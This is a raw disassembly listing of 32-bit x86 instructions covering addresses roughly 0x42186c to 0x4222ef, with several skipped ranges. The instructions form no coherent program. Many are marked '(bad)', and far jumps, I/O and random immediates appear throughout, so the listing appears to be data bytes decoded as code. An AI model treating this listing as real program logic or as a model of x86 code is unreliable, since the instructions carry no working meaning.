  42186c:	jo     0x42183b
  42186e:	push   esi
  42186f:	push   es
  421870:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421871:	pop    ds
  421872:	fcmovbe st,st(3)
  421874:	mov    ah,0xc8
  421876:	push   0x4f
  421878:	sbb    eax,0xce672d47
  42187d:	icebp  
  42187e:	xlat   BYTE PTR ds:[ebx]
  42187f:	aaa    
  421880:	je     0x42187c
  421882:	adc    bl,BYTE PTR [ebx-0x1]
  421885:	(bad)  
  421886:	dec    edx
  421887:	stc    
  421888:	push   es
  421889:	jmp    0x576:0x43be2dc4
  421890:	adc    ebp,edi
  421892:	ficomp DWORD PTR [ebx-0x61]
  421895:	and    ch,BYTE PTR [edi]
  421897:	pop    ds
  421898:	dec    ebp
  421899:	imul   esp,ebx,0x5a4c134
  42189f:	ja     0x4218d2
  4218a1:	daa    
  4218a2:	sub    DWORD PTR [ebx+0x4b991086],ebp
  4218a8:	call   0x8274:0x75b8a63c
  4218af:	mov    ebp,DWORD PTR [ebp-0x852edc4]
  4218b5:	sbb    esp,ebx
  4218b7:	shl    BYTE PTR [edx+ebx*8-0x7f],1
  4218bb:	sbb    edx,DWORD PTR [ebx+eiz*4+0xe]
  4218bf:	mov    edx,0x85fb6322
  4218c4:	aam    0x1f
  4218c6:	rcl    BYTE PTR [eax+0x5],1
  4218c9:	imul   edx,ecx,0xc2cb5dbc
  4218cf:	mov    esi,0x18487e69
  4218d4:	(bad)  
  4218d5:	int    0x99
  4218d7:	cs xchg edx,eax
  4218d9:	fidivr DWORD PTR [edi+0x51848c7]
  4218df:	push   ebx
  4218e0:	mov    eax,ds:0x91f77388
  4218e5:	je     0x42190e
  4218e7:	imul   ecx,DWORD PTR [esi+0x45],0xffffffbe
  4218eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218ec:	pop    ebx
  4218ed:	pusha  
  4218ee:	inc    esp
  4218ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218f0:	shl    BYTE PTR [ebx+ecx*1+0x6131319b],1
  4218f7:	cmp    DWORD PTR ds:0xe957f672,esp
  4218fd:	shl    esp,cl
  4218ff:	dec    ebp
  421900:	jecxz  0x42188b
  421902:	add    BYTE PTR [esi],dh
  421904:	mov    eax,0x67db27fe
  421909:	sub    bh,BYTE PTR [edx+ecx*1]
  42190c:	mov    esp,0xae660afe
  421911:	push   eax
  421912:	xchg   esp,eax
  421913:	sub    BYTE PTR [esi-0x7e],0xc6
  421917:	add    bh,BYTE PTR [bp+di+0x4f]
  42191b:	loop   0x421953
  42191d:	sub    al,0x6a
  42191f:	adc    ecx,DWORD PTR [edi-0x347096b8]
  421925:	out    0xce,al
  421927:	mov    dl,0x37
  421929:	pop    ebp
  42192a:	std    
  42192b:	or     DWORD PTR gs:[edx-0x4d2b6b5b],ebp
  421932:	enter  0x2475,0x0
	...
  421996:	(bad)  
  421997:	cld    
  421998:	je     0x4219b7
  42199a:	jbe    0x421939
  42199c:	(bad)  
  42199d:	dec    DWORD PTR [ebx-0x3d]
  4219a0:	rcl    DWORD PTR [edx+0x6975121c],0xeb
  4219a7:	add    DWORD PTR fs:[eax],eax
  4219aa:	pop    es
  4219ab:	add    DWORD PTR [eax],eax
  4219ad:	add    BYTE PTR [ebx+0x4f5d1cad],cl
  4219b3:	jns    0x4219ee
  4219b5:	iret   
  4219b6:	mov    ds,WORD PTR [eax]
  4219b8:	mov    esp,0x89fec1e5
  4219bd:	push   es
  4219be:	push   DWORD PTR ds:[esi-0x6d84c9fa]
  4219c5:	dec    ecx
  4219c6:	sub    al,0x8e
  4219c8:	lods   al,BYTE PTR ds:[esi]
  4219c9:	dec    esi
  4219ca:	sub    BYTE PTR [edi-0x5c],cl
  4219cd:	pop    ds
  4219ce:	std    
  4219cf:	push   ecx
  4219d0:	xchg   ebx,eax
  4219d1:	adc    al,0xd5
  4219d3:	pop    ebx
  4219d4:	fdiv   DWORD PTR [ebx+0x39]
  4219d7:	into   
  4219d8:	div    BYTE PTR [ebx]
  4219da:	daa    
  4219db:	bound  esi,QWORD PTR [eax-0x53]
  4219de:	sbb    esp,edi
  4219e0:	test   esp,ebx
  4219e2:	popa   
  4219e3:	and    DWORD PTR [eax+0x5ffeff46],esi
  4219e9:	(bad)  
  4219ea:	leave  
  4219eb:	sub    ebp,edx
  4219ed:	idiv   DWORD PTR es:[ebx]
  4219f0:	daa    
  4219f1:	cmp    edx,edx
  4219f3:	minps  xmm0,xmm1
  4219f6:	lahf   
  4219f7:	jns    0x421995
  4219f9:	sbb    bh,BYTE PTR [ebx-0x76]
  4219fc:	mov    ds:0xe3d6cf61,al
  421a01:	mov    dh,0xf1
  421a03:	js     0x4219a4
  421a05:	and    esp,eax
  421a07:	ins    BYTE PTR es:[edi],dx
  421a08:	push   ebx
  421a09:	cmp    DWORD PTR [edx],esi
  421a0b:	push   edi
  421a0c:	cmp    edx,ebp
  421a0e:	lods   al,BYTE PTR ds:[esi]
  421a0f:	dec    ecx
  421a10:	mov    DWORD PTR [eax-0x38],ebx
  421a13:	add    DWORD PTR [eax],esp
  421a15:	gs daa 
  421a17:	aad    0xc4
  421a19:	push   ebp
  421a1a:	or     DWORD PTR [edx+0x57b7e746],esi
  421a20:	inc    ebp
  421a21:	dec    ebp
  421a22:	pop    ss
  421a23:	or     DWORD PTR [esi+0xd],eax
  421a26:	test   BYTE PTR [edi+ebp*1+0x4114091a],bh
  421a2d:	push   edi
  421a2e:	repnz pop edi
  421a30:	and    dh,BYTE PTR ds:0x53283253
  421a36:	(bad)  
  421a37:	jmp    0x8ac14fd2
  421a3c:	and    eax,0xd68db94
  421a41:	pop    ecx
  421a42:	je     0x421aba
  421a44:	lahf   
  421a45:	mov    eax,0xd642de1f
  421a4a:	lahf   
  421a4b:	sbb    DWORD PTR [edi-0x21],eax
  421a4e:	jmp    0x421a0a
  421a50:	xchg   edx,eax
  421a51:	cmp    DWORD PTR fs:[edi+0x244f2919],0x29817807
  421a5c:	mov    edx,0x7e2bbc22
  421a61:	mov    al,BYTE PTR [edx-0x7d52e113]
  421a67:	pop    esp
  421a68:	hlt    
  421a69:	jecxz  0x421a70
  421a6b:	xor    eax,0xb1a3e533
  421a70:	pop    ebp
  421a71:	stos   BYTE PTR es:[edi],al
  421a72:	sahf   
  421a73:	arpl   WORD PTR [eax+0xc64b567],bp
  421a79:	cmp    al,0x3f
  421a7b:	inc    ecx
  421a7c:	xor    al,0x4c
  421a7e:	jmp    0x51fa:0x7cfb169a
  421a85:	fst    QWORD PTR [edx]
  421a87:	fst    QWORD PTR [edx]
  421a89:	test   BYTE PTR [ecx+0x0],ch
  421a8c:	or     al,al
  421a8e:	iret   
  421a8f:	inc    esi
  421a90:	leave  
  421a91:	jge    0x421a38
  421a93:	mov    BYTE PTR [edi-0x58743367],dh
  421a99:	inc    ebx
  421a9a:	jns    0x421aa6
  421a9c:	ss mov ebx,0x568f8e5d
  421aa2:	loopne 0x421a96
  421aa4:	mov    al,ds:0x7396b442
  421aa9:	sub    dl,ah
  421aab:	call   0xa2c94b9d
  421ab0:	xor    BYTE PTR [edi-0x52],cl
  421ab3:	mov    eax,0xb7
	...
  421b14:	add    BYTE PTR [eax],al
  421b16:	push   ss
  421b17:	cdq    
  421b18:	jmp    0x37400aea
  421b1d:	fcmovnu st,st(5)
  421b1f:	sahf   
  421b20:	test   DWORD PTR [edx+0x7295e2a2],0x165f2
  421b2a:	pop    es
  421b2b:	add    DWORD PTR [eax],eax
  421b2d:	add    BYTE PTR [ecx-0x37],ch
  421b30:	or     ah,BYTE PTR [ebp-0x399446b0]
  421b36:	test   eax,0xb45585e3
  421b3b:	in     al,dx
  421b3c:	mov    al,ds:0xad86efed
  421b41:	cmp    ecx,edi
  421b43:	or     al,0x6
  421b45:	cmp    bh,BYTE PTR [ecx+0x1466ca5d]
  421b4b:	mov    ecx,0x24698cc2
  421b50:	push   eax
  421b51:	or     eax,0x42132d70
  421b56:	js     0x421bb5
  421b58:	jne    0x421ae0
  421b5a:	outs   dx,DWORD PTR ds:[esi]
  421b5b:	jg     0x421b26
  421b5d:	pop    es
  421b5e:	jle    0x421bce
  421b60:	jno    0x421af5
  421b62:	jo     0x421b5b
  421b64:	sub    bh,BYTE PTR [edx-0x6a8cc1f]
  421b6a:	push   ds
  421b6b:	mov    esi,0x9d0aa014
  421b70:	jno    0x421b78
  421b72:	xor    ebx,DWORD PTR es:[edx-0x282d2177]
  421b79:	std    
  421b7a:	shr    DWORD PTR [esi+esi*1+0x6e10a3f7],1
  421b81:	mov    bl,0xaa
  421b83:	arpl   WORD PTR [ebx],si
  421b85:	or     eax,DWORD PTR [ecx+0x1465f1a1]
  421b8b:	(bad)  
  421b8d:	ret    
  421b8e:	xlat   BYTE PTR ds:[ebx]
  421b8f:	xor    bl,ah
  421b91:	stos   DWORD PTR es:[edi],eax
  421b92:	repnz inc ebx
  421b94:	xor    al,0x3
  421b96:	ret    
  421b97:	dec    esi
  421b98:	(bad)  [ebp-0x1f305f00]
  421b9e:	loopne 0x421b3e
  421ba0:	mov    ah,0x65
  421ba2:	mov    al,0xa2
  421ba4:	sub    eax,0xd57f007a
  421ba9:	stc    
  421baa:	push   ebp
  421bab:	data16 stc 
  421bad:	or     al,0x81
  421baf:	push   ecx
  421bb0:	aaa    
  421bb1:	push   es
  421bb2:	int3   
  421bb3:	mov    cs,WORD PTR [esi+edi*4]
  421bb6:	sbb    BYTE PTR [esp+eax*1+0x572669b7],0xa7
  421bbe:	mov    dh,0xf6
  421bc0:	jecxz  0x421b6c
  421bc2:	fwait
  421bc3:	or     eax,0xfb2fed74
  421bc8:	dec    ebx
  421bc9:	cmp    dl,ah
  421bcb:	or     al,0x13
  421bcd:	mov    cl,bh
  421bcf:	adc    DWORD PTR ds:0x2285b472,0x66
  421bd6:	test   BYTE PTR es:[edx+0x5b686f40],bl
  421bdd:	ins    DWORD PTR es:[edi],dx
  421bde:	add    ch,BYTE PTR [ecx+esi*1-0x6]
  421be2:	and    al,0xdb
  421be4:	cmp    edx,esi
  421be6:	jo     0x421c38
  421be8:	cmp    BYTE PTR [eax-0x60c85fbd],dh
  421bee:	sahf   
  421bef:	xor    WORD PTR [eax-0x73],bp
  421bf3:	push   es
  421bf4:	adc    eax,0x5c6178a8
  421bf9:	sar    DWORD PTR ds:0x76bb1a9a,1
  421bff:	or     esp,DWORD PTR [ebp+eiz*8-0x29069613]
  421c06:	adc    al,dh
  421c08:	or     ebx,DWORD PTR [edx+0x11]
  421c0b:	mov    ecx,0xb40547de
  421c10:	aas    
  421c11:	rol    BYTE PTR [ebx+0x5a3a0b8d],0xa4
  421c18:	mov    ds:0xb7bbfb11,al
  421c1d:	es push 0x6fad3e29
  421c23:	cmp    al,0xd9
  421c25:	dec    edx
  421c26:	push   edi
  421c27:	(bad)  [esi+ebx*4-0x3a]
  421c2b:	push   eax
  421c2c:	test   edi,edi
  421c2e:	push   ebx
  421c2f:	dec    eax
  421c30:	pop    eax
  421c31:	cdq    
  421c32:	sti    
  421c33:	leave  
  421c34:	fadd   QWORD PTR [eax]
	...
  421c96:	mov    al,0x6b
  421c98:	mov    ch,0xe5
  421c9a:	(bad)  
  421c9b:	push   eax
  421c9d:	jg     0x421c36
  421c9f:	shl    DWORD PTR [ebp-0x3a7eefe7],0x4b
  421ca6:	stc    
  421ca7:	add    WORD PTR [eax],ax
  421caa:	pop    es
  421cab:	add    DWORD PTR [eax],eax
  421cad:	add    BYTE PTR [ecx-0x532c4a15],ah
  421cb3:	pop    edx
  421cb4:	mov    esp,0x17618d1a
  421cb9:	jnp    0x421cea
  421cbb:	mov    edx,0xda689830
  421cc0:	sub    edi,DWORD PTR [ebx-0x73]
  421cc3:	mov    DWORD PTR [esi+0x4c],ebx
  421cc6:	(bad)  
  421cc7:	pop    ss
  421cc8:	jg     0x421c6c
  421cca:	inc    edx
  421ccb:	iret   
  421ccc:	addr16 out 0x6a,al
  421ccf:	adc    DWORD PTR [edx-0x59],esp
  421cd2:	inc    edx
  421cd3:	xchg   BYTE PTR [ecx],cl
  421cd5:	cmp    eax,0x93cb44db
  421cda:	repz cs imul ebx,eax,0x8
  421cdf:	jno    0x421d21
  421ce1:	clc    
  421ce2:	dec    esp
  421ce3:	add    BYTE PTR [esi+edi*1-0x15],dl
  421ce7:	pop    edx
  421ce8:	cmp    DWORD PTR [edx+0x29],edx
  421ceb:	push   ebx
  421cec:	(bad)  
  421cee:	mov    dl,0x78
  421cf0:	cmp    BYTE PTR [edx-0x4e28de8f],bl
  421cf6:	retf   0xfc7c
  421cf9:	gs popf 
  421cfb:	mov    esp,0x1b25572b
  421d00:	jle    0x421cfa
  421d02:	inc    ebp
  421d03:	test   al,0xad
  421d05:	es mov al,0x1d
  421d08:	les    edi,FWORD PTR [esi-0x53]
  421d0b:	dec    ebp
  421d0c:	outs   dx,DWORD PTR ds:[esi]
  421d0d:	or     al,0x2b
  421d0f:	outs   dx,DWORD PTR ds:[esi]
  421d10:	ror    BYTE PTR [ebx+0x4bf66d66],1
  421d16:	xchg   esi,eax
  421d17:	mov    cl,0x75
  421d19:	pop    ebx
  421d1a:	cmp    BYTE PTR [edi-0x21733ac1],bl
  421d20:	cmc    
  421d21:	xchg   ebx,eax
  421d22:	sbb    ch,BYTE PTR [esi]
  421d24:	das    
  421d25:	inc    edx
  421d26:	dec    eax
  421d27:	ss push esp
  421d29:	das    
  421d2a:	cmp    esi,edx
  421d2c:	pop    ebp
  421d2d:	add    DWORD PTR [bp+si-0x6c71],edi
  421d32:	test   DWORD PTR [esi+ecx*1-0x7795ef97],edi
  421d39:	shl    BYTE PTR ds:0x1a16d77f,1
  421d3f:	mov    eax,0xa68622f4
  421d44:	adc    BYTE PTR [ecx-0x558d35a1],dl
  421d4a:	inc    ebx
  421d4b:	repnz ficomp WORD PTR [ebp+0x7e]
  421d4f:	mov    WORD PTR [ecx+esi*1+0x5d],ds
  421d53:	das    
  421d54:	sahf   
  421d55:	ret    
  421d56:	imul   ebp,DWORD PTR ds:[esi],0xc60f037b
  421d5d:	xchg   BYTE PTR [edx],cl
  421d5f:	xor    al,0xc5
  421d61:	sbb    eax,0xa5f3007f
  421d66:	mov    al,ds:0x99c567e7
  421d6b:	xchg   ebx,eax
  421d6c:	mov    dh,0xec
  421d6e:	add    ecx,DWORD PTR [edx+0xd67208f]
  421d74:	pop    edi
  421d75:	push   ss
  421d76:	in     al,0xb6
  421d78:	rcl    edx,0xea
  421d7b:	lds    ebx,FWORD PTR [edx+0x24e9aaa9]
  421d81:	stos   DWORD PTR es:[edi],eax
  421d82:	clc    
  421d83:	jge    0x421d53
  421d85:	nop
  421d86:	adc    al,0x11
  421d88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d89:	jmp    FWORD PTR [ebx]
  421d8b:	sub    eax,0x73e74912
  421d90:	inc    ebp
  421d91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d92:	iret   
  421d93:	dec    ebx
  421d94:	(bad)  
  421d95:	xchg   esi,eax
  421d96:	mov    esp,0xa172e35a
  421d9b:	stos   DWORD PTR es:[edi],eax
  421d9c:	frndint 
  421d9e:	ret    
  421d9f:	inc    esp
  421da0:	rcr    BYTE PTR [esi],cl
  421da2:	mov    esi,0x42f27804
  421da7:	retf   0x5384
  421daa:	cwde   
  421dab:	sub    al,0xf8
  421dad:	cdq    
  421dae:	fstp   DWORD PTR [edi+0x49]
  421db1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421db2:	xor    cl,BYTE PTR [edx-0x73]
	...
  421e15:	add    bh,cl
  421e17:	mov    eax,ds:0xbf7f851b
  421e1c:	fucomip st,st(3)
  421e1e:	lock jbe 0x421e3b
  421e21:	cmp    ah,dh
  421e23:	mov    WORD PTR [eax],cs
  421e25:	lahf   
  421e26:	add    BYTE PTR [eax+0x1],ch
  421e29:	add    BYTE PTR [edi],al
  421e2b:	add    DWORD PTR [eax],eax
  421e2d:	add    BYTE PTR [ebx],bl
  421e2f:	adc    eax,edx
  421e31:	cmp    DWORD PTR ds:0x9fdb9ebd,ebp
  421e37:	popa   
  421e38:	add    dl,al
  421e3a:	sahf   
  421e3b:	addr16 mov ecx,0x9583b05a
  421e41:	pop    ss
  421e42:	push   ds
  421e43:	fisttp DWORD PTR [esi-0x4f191b93]
  421e49:	lods   al,BYTE PTR ds:[esi]
  421e4a:	xor    ebx,DWORD PTR [ecx+0x42809f8]
  421e50:	(bad)  
  421e51:	shl    BYTE PTR [eax],1
  421e53:	sub    DWORD PTR [edi-0x4],ecx
  421e56:	mov    eax,0x579c0bb9
  421e5b:	repz cmp DWORD PTR [ecx-0x1d578634],ecx
  421e62:	in     eax,dx
  421e63:	add    al,bl
  421e65:	outs   dx,BYTE PTR ds:[esi]
  421e66:	and    dh,dh
  421e68:	scas   eax,DWORD PTR es:[edi]
  421e69:	lods   eax,DWORD PTR ds:[esi]
  421e6a:	scas   eax,DWORD PTR es:[edi]
  421e6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e6c:	not    DWORD PTR [esi]
  421e6e:	leave  
  421e6f:	loopne 0x421e4d
  421e71:	push   ebx
  421e72:	add    eax,edi
  421e74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e75:	std    
  421e76:	xchg   ebp,eax
  421e77:	xor    cl,BYTE PTR ds:0x58e80ac0
  421e7d:	mov    BYTE PTR [eax+0x5c42f1c8],ah
  421e83:	popf   
  421e84:	out    dx,eax
  421e85:	into   
  421e86:	add    BYTE PTR [esi],al
  421e88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e89:	lds    edi,FWORD PTR [ebx-0x36d8b380]
  421e8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e90:	sbb    eax,0x16688f30
  421e95:	pusha  
  421e96:	cmp    eax,0x7b22f570
  421e9b:	scas   eax,DWORD PTR es:[edi]
  421e9c:	mov    BYTE PTR [ebx-0x49d21ae0],cl
  421ea2:	pop    ecx
  421ea3:	inc    DWORD PTR [ebp-0x3]
  421ea6:	into   
  421ea7:	nop
  421ea8:	adc    BYTE PTR [ebx+0x76],0x46
  421eac:	js     0x421ebe
  421eae:	push   edx
  421eaf:	in     al,dx
  421eb0:	jle    0x421e79
  421eb2:	cld    
  421eb3:	aaa    
  421eb4:	and    cl,BYTE PTR ds:0x7dba4114
  421eba:	sbb    eax,0xa4046baf
  421ebf:	add    cl,BYTE PTR [ebp+0x1d]
  421ec2:	jecxz  0x421f13
  421ec4:	and    DWORD PTR [ebp-0x2d],eax
  421ec7:	lods   eax,DWORD PTR ds:[esi]
  421ec8:	adc    al,0x24
  421eca:	and    DWORD PTR [ebx-0x3ee8a453],esi
  421ed0:	lock add BYTE PTR [eax-0x64],cl
  421ed4:	es xor al,0xb0
  421ed7:	fs pop eax
  421ed9:	cli    
  421eda:	dec    ecx
  421edb:	ficom  DWORD PTR [ecx+edi*1+0x1c]
  421edf:	out    dx,al
  421ee0:	fdivr  DWORD PTR [edx-0x5b]
  421ee3:	mov    ah,0x3
  421ee5:	lea    esp,[edx]
  421ee7:	adc    esi,DWORD PTR [esp+esi*2-0x6d875ccb]
  421eee:	sub    DWORD PTR [ebx+0x2e7ca39f],esi
  421ef4:	xor    edi,eax
  421ef6:	and    cl,BYTE PTR [ecx+0x1c365bcb]
  421efc:	pop    ss
  421efd:	test   BYTE PTR [ebx+0xb],0x3f
  421f01:	add    ebx,DWORD PTR [edx+esi*8+0x71b6abbe]
  421f08:	inc    ecx
  421f09:	xor    ecx,eax
  421f0b:	jno    0x421ece
  421f0d:	(bad)  
  421f0e:	xor    edx,DWORD PTR [edi+0x5f85835d]
  421f14:	jnp    0x421f2b
  421f16:	icebp  
  421f17:	rcr    BYTE PTR [edx],cl
  421f19:	cmp    al,0x44
  421f1b:	mov    DWORD PTR [eax],ecx
  421f1d:	push   esi
  421f1e:	pop    eax
  421f1f:	lds    edi,FWORD PTR [eax-0x15e9a5f1]
  421f25:	out    dx,eax
  421f26:	adc    DWORD PTR ds:[ebx+0x42f3f9bd],esi
  421f2d:	scas   al,BYTE PTR es:[edi]
  421f2e:	xor    esp,ebp
  421f30:	pop    ecx
  421f31:	in     eax,dx
  421f32:	shl    BYTE PTR [esi],cl
  421f34:	mov    BYTE PTR [eax],0x0
	...
  421f93:	add    BYTE PTR [eax],al
  421f95:	add    BYTE PTR [ebx+0x6],ch
  421f98:	(bad)  
  421f99:	dec    edi
  421f9a:	out    dx,eax
  421f9b:	iret   
  421f9c:	jmp    0x421fc4
  421f9e:	das    
  421f9f:	mov    esi,0xec3daf78
  421fa4:	loopne 0x421fed
  421fa6:	pop    es
  421fa7:	imul   eax,DWORD PTR [ecx],0x10700
  421fad:	add    BYTE PTR [edi+0x43054198],dh
  421fb3:	push   0xffffffd8
  421fb5:	gs int3 
  421fb7:	xor    DWORD PTR [edi+ebp*2-0x63],esp
  421fbb:	loope  0x421fb8
  421fbd:	pop    ebp
  421fbe:	sbb    eax,0x7420a6d1
  421fc3:	mov    dh,0x8c
  421fc5:	imul   ecx,DWORD PTR [ecx+0x77],0x4f0a5a0a
  421fcc:	pop    edx
  421fcd:	ror    DWORD PTR [ecx+0x7c576516],0x8b
  421fd4:	and    esi,edx
  421fd6:	call   0xb16e:0x9f2d0755
  421fdd:	test   al,0xd0
  421fdf:	mov    edi,0x2b18651b
  421fe4:	test   al,dl
  421fe6:	xchg   esi,eax
  421fe7:	cld    
  421fe8:	dec    ebx
  421fe9:	ret    0xe0ea
  421fec:	lea    eax,[ebx-0x538b5290]
  421ff2:	in     eax,dx
  421ff3:	mov    eax,0x96274274
  421ff8:	xor    DWORD PTR [edx+0x25],ecx
  421ffb:	add    BYTE PTR [esi],dh
  421ffd:	test   al,0x18
  421fff:	jmp    0xbed63e14
  422004:	sbb    al,0x5
  422006:	pop    edi
  422007:	adc    eax,0xa451a2ff
  42200c:	sbb    esi,eax
  42200e:	adc    BYTE PTR [esp+ecx*4-0x21],0x24
  422013:	add    eax,0xf227d4c1
  422018:	sub    edi,DWORD PTR [edx+0x2d9db6ba]
  42201e:	mov    bl,al
  422020:	sbb    bh,cl
  422022:	or     dh,BYTE PTR [ecx+0x6f34436d]
  422028:	ins    BYTE PTR es:[edi],dx
  422029:	push   0xe3c9ba0f
  42202e:	sub    bh,dh
  422030:	out    dx,al
  422031:	aas    
  422032:	dec    esi
  422033:	xor    al,0x7d
  422035:	jne    0x422027
  422037:	mov    dl,0xcc
  422039:	push   ebp
  42203a:	or     dl,dh
  42203c:	xlat   BYTE PTR ds:[ebx]
  42203d:	out    0x89,eax
  42203f:	xchg   BYTE PTR [ebx+0x3],dh
  422042:	jl     0x421ff5
  422044:	repnz push esp
  422046:	enter  0xd1d5,0x63
  42204a:	mov    ds:0x195e5a04,eax
  42204f:	pop    ebx
  422050:	rol    DWORD PTR [ebx-0x544786ab],0xe1
  422057:	(bad)  
  422058:	aad    0xc7
  42205a:	mov    edi,0x81924a23
  42205f:	stos   BYTE PTR es:[edi],al
  422060:	imul   edx,esp,0xb461d3b5
  422066:	aam    0xd9
  422068:	push   ds
  422069:	frstor [ebp+0x2b2f2044]
  42206f:	xchg   ecx,eax
  422070:	push   0xffffff8f
  422072:	or     al,0x74
  422074:	sub    BYTE PTR [eax+0x7c],cl
  422077:	xchg   ebp,eax
  422078:	cmp    BYTE PTR [esi],bh
  42207a:	mov    cs,WORD PTR [edi]
  42207c:	adc    dl,BYTE PTR ds:0x142f1d5
  422082:	nop
  422083:	or     al,0x9c
  422085:	jge    0x422092
  422087:	bound  eax,QWORD PTR [esp+ecx*2]
  42208a:	sub    eax,0xed25739e
  42208f:	icebp  
  422090:	shl    BYTE PTR [ecx+ecx*1+0x1],0x1a
  422095:	add    DWORD PTR [edi+0x42],edx
  422098:	push   es
  422099:	inc    edx
  42209a:	jno    0x4220e5
  42209c:	out    0x62,al
  42209e:	stos   BYTE PTR es:[edi],al
  42209f:	adc    DWORD PTR [ebx],0xc57779ea
  4220a5:	cmp    eax,0xa5524ffc
  4220aa:	ret    0xe827
  4220ad:	add    ecx,DWORD PTR ds:0xad73a097
  4220b3:	aaa    
  4220b4:	and    al,BYTE PTR [eax]
	...
  422116:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422117:	push   edx
  422118:	jnp    0x422117
  42211a:	(bad)  
  42211b:	std    
  42211c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42211d:	pop    ebx
  42211e:	or     ebx,ebp
  422120:	retf   0xd65c
  422123:	adc    BYTE PTR [edi+0x7],dh
  422126:	push   cs
  422127:	push   0x1
  422129:	add    BYTE PTR [edi],al
  42212b:	add    DWORD PTR [eax],eax
  42212d:	add    ah,ch
  42212f:	mov    ds:0xfc100e8e,eax
  422134:	imul   esp,DWORD PTR [ebp+0x7],0x12
  422138:	int3   
  422139:	mov    ds,WORD PTR [ebx+0x15]
  42213c:	test   eax,0x829e99ab
  422141:	mov    eax,0x888c528e
  422146:	mov    BYTE PTR [esi+0x4f686501],al
  42214c:	dec    ebx
  42214d:	sub    bh,BYTE PTR [edi]
  42214f:	or     DWORD PTR [eax+0xb40a091],ebx
  422155:	aad    0x99
  422157:	sub    DWORD PTR [ebx-0x28],0x1d293da8
  42215e:	add    BYTE PTR [ecx+0x2c],ah
  422161:	jg     0x422112
  422163:	stc    
  422164:	into   
  422165:	xchg   esi,eax
  422166:	je     0x42214b
  422168:	fisttp WORD PTR [ebp+0x11]
  42216b:	fisttp QWORD PTR [ecx]
  42216d:	shl    BYTE PTR [edi-0x12830dc0],cl
  422173:	jmp    0xeff10a22
  422178:	in     al,dx
  422179:	(bad)  
  42217a:	into   
  42217b:	jns    0x422123
  42217d:	jecxz  0x4221d8
  42217f:	dec    esp
  422180:	imul   esi,DWORD PTR [edi],0xffffff92
  422183:	repz fwait
  422185:	dec    edi
  422186:	call   0xedc3:0xf21e4d0e
  42218d:	adc    DWORD PTR [edx],ebp
  42218f:	or     BYTE PTR [ebp-0x49],bl
  422192:	xor    BYTE PTR [ecx-0x70536a53],cl
  422198:	jo     0x422162
  42219a:	addr16 cmp eax,0xafad328b
  4221a0:	sub    ebp,0xffffff89
  4221a3:	ss je  0x42214d
  4221a6:	add    DWORD PTR [edx],0x49ee309
  4221ac:	dec    eax
  4221ad:	mul    BYTE PTR [esi-0x3eb39882]
  4221b3:	xchg   ecx,eax
  4221b4:	adc    al,0x4f
  4221b6:	inc    ebp
  4221b7:	(bad)  
  4221b9:	mov    esi,0x2a001bc7
  4221be:	(bad)  
  4221bf:	inc    ecx
  4221c0:	and    al,0x2c
  4221c2:	xor    DWORD PTR ds:0xc11aae21,eax
  4221c8:	dec    eax
  4221c9:	mov    al,ds:0xda69ba69
  4221ce:	cwde   
  4221cf:	ins    BYTE PTR es:[edi],dx
  4221d0:	inc    edi
  4221d1:	stos   BYTE PTR es:[edi],al
  4221d2:	xor    BYTE PTR [ecx],0xcc
  4221d5:	loopne 0x422207
  4221d7:	cmp    al,0x68
  4221d9:	in     al,dx
  4221da:	sub    edx,DWORD PTR [esi+ebp*1+0x68]
  4221de:	and    ah,BYTE PTR [ebx-0x34]
  4221e1:	or     BYTE PTR [eax+ebx*8],0xf3
  4221e5:	add    dl,ch
  4221e7:	push   ebp
  4221e8:	xor    ebx,DWORD PTR [edi]
  4221ea:	pop    edi
  4221eb:	and    ah,al
  4221ed:	and    bl,BYTE PTR [esi+0x1cc18594]
  4221f3:	push   ebx
  4221f4:	clc    
  4221f5:	jmp    DWORD PTR [ecx-0x76]
  4221f8:	mov    esi,0x9eb8535f
  4221fd:	push   0xc3c4ad8a
  422202:	sti    
  422203:	cmp    ah,dl
  422205:	mov    edi,DWORD PTR [esi]
  422207:	mov    ah,0x17
  422209:	out    0x8,al
  42220b:	inc    DWORD PTR [esp+eiz*2-0x50]
  42220f:	cmc    
  422210:	mov    ecx,0x4d58456c
  422215:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422216:	cmp    DWORD PTR [edx-0x4a],edi
  422219:	mov    ebp,0xf4ab5389
  42221e:	test   BYTE PTR [ebp-0x4d0608ab],0x41
  422225:	pop    esi
  422226:	ds call 0xdc7cc32f
  42222c:	fs test al,0x8b
  42222f:	mov    dh,0xf0
  422231:	push   esi
  422232:	cli    
  422233:	sub    BYTE PTR [ecx],al
	...
  422295:	add    BYTE PTR [edi-0x10085213],cl
  42229b:	neg    edi
  42229d:	std    
  42229e:	fsubr  DWORD PTR [edi-0x12]
  4222a1:	adc    esi,DWORD PTR [eax+0x52]
  4222a4:	add    DWORD PTR [edx*1+0x700016b],0x94000001
  4222af:	cmp    dl,cl
  4222b1:	push   edx
  4222b2:	inc    ebp
  4222b3:	dec    edi
  4222b4:	jecxz  0x4222c6
  4222b6:	and    eax,0x12cd36dd
  4222bb:	ret    0xa97a
  4222be:	push   esi
  4222bf:	loop   0x4222c3
  4222c1:	jno    0x422263
  4222c3:	mov    al,ds:0xbcf9e9e6
  4222c8:	lock jp 0x422281
  4222cb:	rol    BYTE PTR ds:0xfe273d8f,1
  4222d1:	das    
  4222d2:	dec    ecx
  4222d3:	neg    ah
  4222d5:	dec    eax
  4222d6:	data16 jecxz 0x4222d1
  4222d9:	jnp    0x422305
  4222db:	add    bh,BYTE PTR [esi-0x51]
  4222de:	adc    DWORD PTR ds:0x58d8cb93,edi
  4222e4:	outs   dx,DWORD PTR ds:[esi]
  4222e5:	sti    
  4222e6:	stos   BYTE PTR es:[edi],al
  4222e7:	cmp    ecx,DWORD PTR [edi]
  4222e9:	popf   
  4222ea:	push   0xad293bce
  4222ef:	mov    bh,0xe8
